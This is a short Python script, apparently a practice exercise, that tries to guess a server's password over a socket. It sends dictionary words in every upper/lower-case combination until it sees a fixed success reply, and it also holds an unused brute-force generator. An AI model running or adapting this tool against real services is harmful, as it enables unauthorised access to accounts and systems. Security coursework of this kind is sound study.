import sys
import socket
import string
import itertools


class PasswordGenerator:
    @staticmethod
    def get_passwords_from_file():
        file = open('passwords.txt', 'r')
        dictionary = list()
        for line in file:
            dictionary.append(line.rstrip("\n"))
        return dictionary

    # Generator function that returns brute force passwords.
    @staticmethod
    def random_password_generator():
        possible_characters = string.ascii_lowercase + string.digits
        password_length = 1
        while True:
            for i in itertools.product(possible_characters, repeat=password_length):
                yield i
            password_length += 1

    @staticmethod
    def most_used_passwords_generator():
        most_used_passwords = PasswordGenerator.get_passwords_from_file()
        file = open('passwords.txt', 'r')

        # changing the cases in different letters
        for line in file:
            current_password = line.rstrip("\n")
            if not current_password.isdigit():
                for var in itertools.product(*([letter.lower(), letter.upper()] for letter in current_password)):
                    yield "".join(var)
            else:
                yield current_password


# getting list of arguments
args = sys.argv

if len(args) != 3:
    print("The script should be called with two arguments (host name and address)")
    sys.exit()

# initialising arguments
hostname = args[1]
port = int(args[2])
address = (hostname, port)
client_socket = socket.socket()

# connecting to the socket with the given address
client_socket.connect(address)

response = None
password = None
password_generator = PasswordGenerator.most_used_passwords_generator()
while response != "Connection success!":
    password = next(password_generator)

    # sending the given password
    bytes_message = password.encode()
    client_socket.send(bytes_message)

    # printing the server's response
    response = client_socket.recv(1024)
    response = response.decode()

print(password)

# closing the socket
client_socket.close()
